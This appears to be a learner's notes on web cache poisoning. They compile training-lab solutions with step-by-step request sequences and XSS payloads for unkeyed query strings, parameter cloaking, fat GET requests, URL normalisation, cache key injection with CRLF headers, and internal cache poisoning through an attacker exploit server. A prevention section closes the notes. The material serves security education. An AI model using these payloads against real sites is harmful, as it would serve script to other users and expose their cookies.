This lab is vulnerable to web cache poisoning because the query string is unkeyed. A user regularly visits this site's home page using Chrome.

To solve the lab, poison the home page with a response that executes alert(1) in the victim's browser.

 Hint
ACCESS THE LAB
 Solution
With Burp running, load the website's home page. In Burp, go to "Proxy" > "HTTP history". Find the GET request for the home page. Notice that this page is a potential cache oracle. Send the request to Burp Repeater.
Add arbitrary query parameters to the request. Observe that you can still get a cache hit even if you change the query parameters. This indicates that they are not included in the cache key.
Notice that you can use the Origin header as a cache buster. Add it to your request.
When you get a cache miss, notice that your injected parameters are reflected in the response. If the response to your request is cached, you can remove the query parameters and they will still be reflected in the cached response.
Add an arbitrary parameter that breaks out of the reflected string and injects an XSS payload:

GET /?evil='/><script>alert(1)</script>
Keep replaying the request until you see your payload reflected in the response and X-Cache: hit in the headers.
To simulate the victim, remove the query string from your request and send it again (while using the same cache buster). Check that you still receive the cached response containing your payload.
Remove the cache-buster Origin header and add your payload back to the query string. Replay the request until you have poisoned the cache for normal users. Confirm this attack has been successful by loading the home page in the browser and observing the popup.
The lab will be solved when the victim user visits the poisoned home page. You may need to re-poison the cache if the lab is not solved after 35 seconds.


#Unkeyed query parameters
So far we've seen that on some websites, the entire query string is excluded from the cache key. But some websites only exclude specific query parameters that are not relevant to the back-end application, such as parameters for analytics or serving targeted advertisements. UTM parameters like utm_content are good candidates to check during testing.

Parameters that have been excluded from the cache key are unlikely to have a significant impact on the response. The chances are there won't be any useful gadgets that accept input from these parameters. That said, some pages handle the entire URL in a vulnerable manner, making it possible to exploit arbitrary parameters.

#Lab08 : Web cache poisoning via an unkeyed query parameter
This lab is vulnerable to web cache poisoning because it excludes a certain parameter from the cache key. A user regularly visits this site's home page using Chrome.

To solve the lab, poison the cache with a response that executes alert(1) in the victim's browser.
 Solution
Observe that the home page is a suitable cache oracle. Notice that you get a cache miss whenever you change the query string. This indicates that it is part of the cache key. Also notice that the query string is reflected in the response.
Add a cache-buster query parameter.
Use Param Miner's "Guess GET parameters" feature to identify that the parameter utm_content is supported by the application.
Confirm that this parameter is unkeyed by adding it to the query string and checking that you still get a cache hit. Keep sending the request until you get a cache miss. Observe that this unkeyed parameter is also reflected in the response along with the rest of the query string.
Send a request with a utm_content parameter that breaks out of the reflected string and injects an XSS payload:

GET /?utm_content='/><script>alert(1)</script>
Once your payload is cached, remove the utm_content parameter, right-click on the request, and select "Copy URL". Open this URL in the browser and check that the alert() is triggered when you load the page.
Remove your cache buster, re-add the utm_content parameter with your payload, and replay the request until the cache is poisoned for normal users. The lab will be solved when the victim user visits the poisoned home page.


#Cache parameter cloaking
If the cache excludes a harmless parameter from the cache key, and you can't find any exploitable gadgets based on the full URL, you'd be forgiven for thinking that you've reached a dead end. However, this is actually where things can get interesting.

If you can work out how the cache parses the URL to identify and remove the unwanted parameters, you might find some interesting quirks. Of particular interest are any parsing discrepancies between the cache and the application. This can potentially allow you to sneak arbitrary parameters into the application logic by "cloaking" them in an excluded parameter.

For example, the de facto standard is that a parameter will either be preceded by a question mark (?), if it's the first one in the query string, or an ampersand (&). Some poorly written parsing algorithms will treat any ? as the start of a new parameter, regardless of whether it's the first one or not.

Let's assume that the algorithm for excluding parameters from the cache key behaves in this way, but the server's algorithm only accepts the first ? as a delimiter. Consider the following request:

GET /?example=123?excluded_param=bad-stuff-here
In this case, the cache would identify two parameters and exclude the second one from the cache key. However, the server doesn't accept the second ? as a delimiter and instead only sees one parameter, example, whose value is the entire rest of the query string, including our payload. If the value of example is passed into a useful gadget, we have successfully injected our payload without affecting the cache key.

Exploiting parameter parsing quirks
Similar parameter cloaking issues can arise in the opposite scenario, where the back-end identifies distinct parameters that the cache does not. The Ruby on Rails framework, for example, interprets both ampersands (&) and semicolons (;) as delimiters. When used in conjunction with a cache that does not allow this, you can potentially exploit another quirk to override the value of a keyed parameter in the application logic.

Consider the following request:

GET /?keyed_param=abc&excluded_param=123;keyed_param=bad-stuff-here
As the names suggest, keyed_param is included in the cache key, but excluded_param is not. Many caches will only interpret this as two parameters, delimited by the ampersand:

keyed_param=abc
excluded_param=123;keyed_param=bad-stuff-here
Once the parsing algorithm removes the excluded_param, the cache key will only contain keyed_param=abc. On the back-end, however, Ruby on Rails sees the semicolon and splits the query string into three separate parameters:

keyed_param=abc
excluded_param=123
keyed_param=bad-stuff-here
But now there is a duplicate keyed_param. This is where the second quirk comes into play. If there are duplicate parameters, each with different values, Ruby on Rails gives precedence to the final occurrence. The end result is that the cache key contains an innocent, expected parameter value, allowing the cached response to be served as normal to other users. On the back-end, however, the same parameter has a completely different value, which is our injected payload. It is this second value that will be passed into the gadget and reflected in the poisoned response.

This exploit can be especially powerful if it gives you control over a function that will be executed. For example, if a website is using JSONP to make a cross-domain request, this will often contain a callback parameter to execute a given function on the returned data:

GET /jsonp?callback=innocentFunction
In this case, you could use these techniques to override the expected callback function and execute arbitrary JavaScript instead.


#Lab09:Parameter cloaking
This lab is vulnerable to web cache poisoning because it excludes a certain parameter from the cache key. There is also inconsistent parameter parsing between the cache and the back-end. A user regularly visits this site's home page using Chrome.

To solve the lab, use the parameter cloaking technique to poison the cache with a response that executes alert(1) in the victim's browser.

 Hint
ACCESS THE LAB
 Solution
Identify that the utm_content parameter is supported. Observe that it is also excluded from the cache key.
Notice that if you use a semicolon (;) to append another parameter to utm_content, the cache treats this as a single parameter. This means that the extra parameter is also excluded from the cache key. Alternatively, with Param Miner loaded, right-click on the request and select "Bulk scan" > "Rails parameter cloaking scan" to identify the vulnerability automatically.
Observe that every page imports the script /js/geolocate.js, executing the callback function setCountryCookie(). Send the request GET /js/geolocate.js?callback=setCountryCookie to Burp Repeater.
Notice that you can control the name of the function that is called on the returned data by editing the callback parameter. However, you can't poison the cache for other users in this way because the parameter is keyed.
Study the cache behavior. Observe that if you add duplicate callback parameters, only the final one is reflected in the response, but both are still keyed. However, if you append the second callback parameter to the utm_content parameter using a semicolon, it is excluded from the cache key and still overwrites the callback function in the response:

GET /js/geolocate.js?callback=setCountryCookie&utm_content=foo;callback=arbitraryFunction

HTTP/1.1 200 OK
X-Cache-Key: /js/geolocate.js?callback=setCountryCookie
…
arbitraryFunction({"country" : "United Kingdom"})
Send the request again, but this time pass in alert(1) as the callback function:

GET /js/geolocate.js?callback=setCountryCookie&utm_content=foo;callback=alert(1)
Get the response cached, then load the home page in the browser. Check that the alert() is triggered.
Replay the request to keep the cache poisoned. The lab will solve when the victim user visits any page containing this resource import URL.


#Exploiting fat GET support
In select cases, the HTTP method may not be keyed. This might allow you to poison the cache with a POST request containing a malicious payload in the body. Your payload would then even be served in response to users' GET requests. Although this scenario is pretty rare, you can sometimes achieve a similar effect by simply adding a body to a GET request to create a "fat" GET request:

GET /?param=innocent HTTP/1.1
…
param=bad-stuff-here
In this case, the cache key would be based on the request line, but the server-side value of the parameter would be taken from the body.


#Lab10 :  Web cache poisoning via a fat GET request
PRACTITIONER

LAB
Not solved
This lab is vulnerable to web cache poisoning. It accepts GET requests that have a body, but does not include the body in the cache key. A user regularly visits this site's home page using Chrome.

To solve the lab, poison the cache with a response that executes alert(1) in the victim's browser.

ACCESS THE LAB
 Solution
Observe that every page imports the script /js/geolocate.js, executing the callback function setCountryCookie(). Send the request GET /js/geolocate.js?callback=setCountryCookie to Burp Repeater.
Notice that you can control the name of the function that is called in the response by passing in a duplicate callback parameter via the request body. Also notice that the cache key is still derived from the original callback parameter in the request line:

GET /js/geolocate.js?callback=setCountryCookie
…
callback=arbitraryFunction

HTTP/1.1 200 OK
X-Cache-Key: /js/geolocate.js?callback=setCountryCookie
…
arbitraryFunction({"country" : "United Kingdom"})
Send the request again, but this time pass in alert(1) as the callback function. Check that you can successfully poison the cache.
Remove any cache busters and re-poison the cache. The lab will solve when the victim user visits any page containing this resource import URL


#
This is only possible if a website accepts GET requests that have a body, but there are potential workarounds. You can sometimes encourage "fat GET" handling by overriding the HTTP method, for example:

GET /?param=innocent HTTP/1.1
Host: innocent-website.com
X-HTTP-Method-Override: POST
…
param=bad-stuff-here
As long as the X-HTTP-Method-Override header is unkeyed, you could submit a pseudo-POST request while preserving a GET cache key derived from the request line.

Exploiting dynamic content in resource imports
Imported resource files are typically static but some reflect input from the query string. This is mostly considered harmless because browsers rarely execute these files when viewed directly, and an attacker has no control over the URLs used to load a page's subresources. However, by combining this with web cache poisoning, you can occasionally inject content into the resource file.

For example, consider a page that reflects the current query string in an import statement:

GET /style.css?excluded_param=123);@import… HTTP/1.1

HTTP/1.1 200 OK
…
@import url(/site/home/index.part1.8a6715a2.css?excluded_param=123);@import…
You could exploit this behavior to inject malicious CSS that exfiltrates sensitive information from any pages that import /style.css.

If the page importing the CSS file doesn't specify a doctype, you can maybe even exploit static CSS files. Given the right configuration, browsers will simply scour the document looking for CSS and then execute it. This means that you can occasionally poison static CSS files by triggering a server error that reflects the excluded query parameter:

GET /style.css?excluded_param=alert(1)%0A{}*{color:red;} HTTP/1.1

HTTP/1.1 200 OK
Content-Type: text/html
…
This request was blocked due to…alert(1){}*{color:red;}
Normalized cache keys
Any normalization applied to the cache key can also introduce exploitable behavior. In fact, it can occasionally enable some exploits that would otherwise be almost impossible.

For example, when you find reflected XSS in a parameter, it is often unexploitable in practice. This is because modern browsers typically URL-encode the necessary characters when sending the request, and the server doesn't decode them. The response that the intended victim receives will merely contain a harmless URL-encoded string.

Some caching implementations normalize keyed input when adding it to the cache key. In this case, both of the following requests would have the same key:

GET /example?param="><test>
GET /example?param=%22%3e%3ctest%3e
This behavior can allow you to exploit these otherwise "unexploitable" XSS vulnerabilities. If you send a malicious request using Burp Repeater, you can poison the cache with an unencoded XSS payload. When the victim visits the malicious URL, the payload will still be URL-encoded by their browser; however, once the URL is normalized by the cache, it will have the same cache key as the response containing your unencoded payload.

As a result, the cache will serve the poisoned response and the payload will be executed client-side. You just need to make sure that the cache is poisoned when the victim visits the URL.


#Lab11 : URL normalization
This lab contains an XSS vulnerability that is not directly exploitable due to browser URL-encoding.

To solve the lab, take advantage of the cache's normalization process to exploit this vulnerability. Find the XSS vulnerability and inject a payload that will execute alert(1) in the victim's browser. Then, deliver the malicious URL to the victim.

ACCESS THE LAB
 Solution
In Burp Repeater, browse to any non-existent path, such as GET /random. Notice that the path you requested is reflected in the error message.
Add a suitable reflected XSS payload to the request line:

GET /random</p><script>alert(1)</script><p>foo
Notice that if you request this URL in the browser, the payload doesn't execute because it is URL-encoded.
In Burp Repeater, poison the cache with your payload and then immediately load the URL in the browser. This time, the alert() is executed because the browser's encoded payload was URL-decoded by the cache, causing a cache hit with the earlier request.
Re-poison the cache then immediately go to the lab and click "Deliver link to victim". Submit your malicious URL. The lab will be solved when the victim visits the link.



#Cache key injection
You will sometimes discover a client-side vulnerability in a keyed header. This is also a classic "unexploitable" issue that can sometimes be exploited using cache poisoning.

Keyed components are often bundled together in a string to create the cache key. If the cache doesn't implement proper escaping of the delimiters between the components, you can potentially exploit this behavior to craft two different requests that have the same cache key.

The following example uses double-underscores to delimit different components in the cache key and does not escape them. You can exploit this by first poisoning the cache with a request containing your payload in the corresponding keyed header:

GET /path?param=123 HTTP/1.1
Origin: '-alert(1)-'__

HTTP/1.1 200 OK
X-Cache-Key: /path?param=123__Origin='-alert(1)-'__

<script>…'-alert(1)-'…</script>
If you then induce a victim user to visit the following URL, they would be served the poisoned response:

GET /path?param=123__Origin='-alert(1)-'__ HTTP/1.1

HTTP/1.1 200 OK
X-Cache-Key: /path?param=123__Origin='-alert(1)-'__
X-Cache: hit

<script>…'-alert(1)-'…</script>


#Lab12 :Cache key injection

This lab contains multiple independent vulnerabilities, including cache key injection. A user regularly visits this site's home page using Chrome.

To solve the lab, combine the vulnerabilities to execute alert(1) in the victim's browser. Note that you will need to make use of the Pragma: x-get-cache-key header in order to solve this lab.

 Hint
 Hint
ACCESS THE LAB
 Solution
Observe that the redirect at /login excludes the parameter utm_content from the cache key using a flawed regex. This allows you append arbitrary unkeyed content to the lang parameter:

/login?lang=en?utm_content=anything
Observe that the page at /login/ has an import from /js/localize.js. This is vulnerable to client-side parameter pollution via the lang parameter because it doesn't URL-encode the value.
Observe that the login page references an endpoint at /js/localize.js that is vulnerable to response header injection via the Origin request header, provided the cors parameter is set to 1.
Use the Pragma: x-get-cache-key header to identify that the server is vulnerable to cache key injection, meaning the header injection can be triggered via a crafted URL.
Combine these four behaviors by poisoning the cache with following two requests:

GET /js/localize.js?lang=en?utm_content=z&cors=1&x=1 HTTP/2
Origin: x%0d%0aContent-Length:%208%0d%0a%0d%0aalert(1)$$$$

GET /login?lang=en?utm_content=x%26cors=1%26x=1$$origin=x%250d%250aContent-Length:%208%250d%250a%250d%250aalert(1)$$%23 HTTP/2
Note that the injected origin header is lower case to comply with the HTTP/2 specification.

This will poison /login?lang=en such that it redirects to a login page with a poisoned localization import that executes alert(1), solving the lab.

*****summary of lab12******
The four bugs
Cache key excludes utm_content — but the exclusion regex is sloppy. It only recognizes utm_content when introduced by &. If you introduce it with ? instead (/login?lang=en?utm_content=anything), the cache doesn't see it as a separate parameter to exclude — it just treats the whole thing as the value of lang. Result: you can smuggle arbitrary content through lang without changing the cache key.
The login page builds a <script src="/js/localize.js?..."> tag using the raw lang value, unencoded, then always appends its own &cors=0. So whatever garbage you stuffed into lang gets carried straight into a new request the victim's browser will make — but with a fixed &cors=0 tacked on the end, which (as we discovered) overrides any cors=1 you tried to sneak in normally.
localize.js, when called with cors=1, reflects the Origin header into a response header — unsanitized. Inject CRLF sequences into Origin and you can forge a fake Content-Length + body, replacing the entire script's output with e.g. alert(1).
The cache key itself is built by joining components with an unescaped $$ delimiter (confirmed via Pragma: x-get-cache-key). Since $$ isn't escaped, you can inject a fake $$origin=<value>$$ sequence into an unkeyed field and forge whichever cache key you want — including one that matches what a real request will produce
--------------------------------

#


#Lab13 : Internal cache poisoning

This lab is vulnerable to web cache poisoning. It uses multiple layers of caching. A user regularly visits this site's home page using Chrome.

To solve the lab, poison the internal cache so that the home page executes alert(document.cookie) in the victim's browser.

ACCESS THE LAB
 Solution
Notice that the home page is a suitable cache oracle and send the GET / request to Burp Repeater.
Observe that any changes to the query string are always reflected in the response. This indicates that the external cache includes this in the cache key. Use Param Miner to add a dynamic cache-buster query parameter. This will allow you to bypass the external cache.
Observe that the X-Forwarded-Host header is supported. Add this to your request, containing your exploit server URL:

X-Forwarded-Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net
Send the request. If you get lucky with your timing, you will notice that your exploit server URL is reflected three times in the response. However, most of the time, you will see that the URL for the canonical link element and the analytics.js import now both point to your exploit server, but the geolocate.js import URL remains the same.
Keep sending the request. Eventually, the URL for the geolocate.js resource will also be overwritten with your exploit server URL. This indicates that this fragment is being cached separately by the internal cache. Notice that you've been getting a cache hit for this fragment even with the cache-buster query parameter - the query string is unkeyed by the internal cache.
Remove the X-Forwarded-Host header and resend the request. Notice that the internally cached fragment still reflects your exploit server URL, but the other two URLs do not. This indicates that the header is unkeyed by the internal cache but keyed by the external one. Therefore, you can poison the internally cached fragment using this header.
Go to the exploit server and create a file at /js/geolocate.js containing the payload alert(document.cookie). Store the exploit.
Back in Burp Repeater, disable the dynamic cache buster in the query string and re-add the X-Forwarded-Host header to point to your exploit server.
Send the request over and over until all three of the dynamic URLs in the response point to your exploit server. Keep replaying the request to keep the cache poisoned until the victim user visits the page and the lab is solved.

***Summmary*****
The setup: two caches with mismatched blind spots
External cache: keys on the query string (proven: changing ?test=1→?test=2 gave a fresh trackingID each time, but repeating the same query string returned the same trackingID — a hit).
Internal cache: doesn't key on the query string at all, but caches the geolocate.js import URL as its own standalone fragment, separate from the rest of the page.

Because these two caches disagree about what matters, you can use one's blind spot to attack the other.

How we proved it, step by step
Oracle established: trackingID in the page body changes on a fresh response but stays fixed on a cache hit — that gave us a reliable "is this cached?" signal without needing an X-Cache header (this lab doesn't expose one).
Query string is keyed externally: new query value → new trackingID (miss); repeat it → same trackingID (hit). Confirmed the external cache's key includes the query string.
Cache-buster established: since we needed a way to always force a fresh miss from the external cache while testing, we manually varied a ?cb= value on every request (Param Miner would normally automate this, but manual works identically).
X-Forwarded-Host is reflected into three places: the canonical link, the analytics.js import, and the geolocate.js import — all built from that header, unsanitized.
The split that proves the internal cache exists: sending a request without X-Forwarded-Host (but still with a fresh cache-buster, so the external cache still misses) showed the canonical link and analytics.js reverting to normal immediately — since they're rendered live every time — while geolocate.js kept showing the poisoned hostname for a while, because it's served from the internal fragment cache, which doesn't care what your current request's headers say. This inconsistency (some fields fresh, one field stuck) is exactly the "mixed provenance" tell described in the reading.
Volatility is expected: eventually all three reverted together, because the lab's background/simulated traffic keeps overwriting the shared fragment. This isn't a contradiction — it's exactly why the final poisoning step requires continuous replay rather than a single successful request.
The actual exploit
Host alert(document.cookie) at /js/geolocate.js on your exploit server.
Repeatedly send GET / with X-Forwarded-Host pointing at your exploit server, no cache-buster (so it's actually landing on the real key victims will hit).
Keep sending it in a loop until the geolocate.js URL in the response consistently shows your exploit server, and keep replaying to hold that fragment poisoned — since there's no real "key" protecting it, it's a constant tug-of-war against other traffic until the simulated victim's visit lands during your poisoned window.

#
Testing internal caches safely
When testing ordinary web caches, we recommend using a cache buster to prevent your poisoned response from being served to other users. However, if an integrated cache has no concept of cache keys, then traditional cache busters are useless. This means that it's very easy to accidentally poison the cache for genuine users.

Therefore, it is important that you do your best to mitigate the potential damage when testing these kinds of vulnerabilities. Think carefully about the effect of your injected payload before sending each request. In particular, you should make sure that you only poison the cache using a domain that you control, rather than some arbitrary "evil-user.net". This way, you are in control of what happens next if something goes wrong.

#How to prevent web cache poisoning vulnerabilities
The definitive way to prevent web cache poisoning would clearly be to disable caching altogether. While for many websites this might not be a realistic option, in other cases, it might be feasible. For example, if you only use caching because it was switched on by default when you adopted a CDN, it might be worth evaluating whether the default caching options really do reflect your needs.

Even if you do need to use caching, restricting it to purely static responses is also effective, provided you are sufficiently wary about what you class as "static". For instance, make sure that an attacker can't trick the back-end server into retrieving their malicious version of a static resource instead of the genuine one.

This is also related to a wider point about web security. Most websites now incorporate a variety of third-party technologies into both their development processes and day-to-day operations. No matter how robust your own internal security posture may be, as soon as you incorporate third-party technology into your environment, you are relying on its developers also being as security-conscious as you are. On the basis that you are only as secure as your weakest point, it is vital to make sure that you fully understand the security implications of any third-party technology before you integrate it.

Specifically in the context of web cache poisoning, this not only means deciding whether to leave caching switched on by default, but also looking at which headers are supported by your CDN, for example. Several of the web cache poisoning vulnerabilities discussed above are exposed because an attacker is able to manipulate a series of obscure request headers, many of which are entirely unnecessary for the website's functionality. Again, you may be exposing yourself to these kinds of attacks without realizing, purely because you have implemented some technology that supports these unkeyed inputs by default. If a header isn't needed for the site to work, then it should be disabled.

You should also take the following precautions when implementing caching:

If you are considering excluding something from the cache key for performance reasons, rewrite the request instead.
Don't accept fat GET requests. Be aware that some third-party technologies may permit this by default.
Patch client-side vulnerabilities even if they seem unexploitable. Some of these vulnerabilities might actually be exploitable due to unpredictable quirks in your cache's behavior. It could be a matter of time before someone finds a quirk, whether it be cache-based or otherwise, that makes this vulnerability exploitable.



```
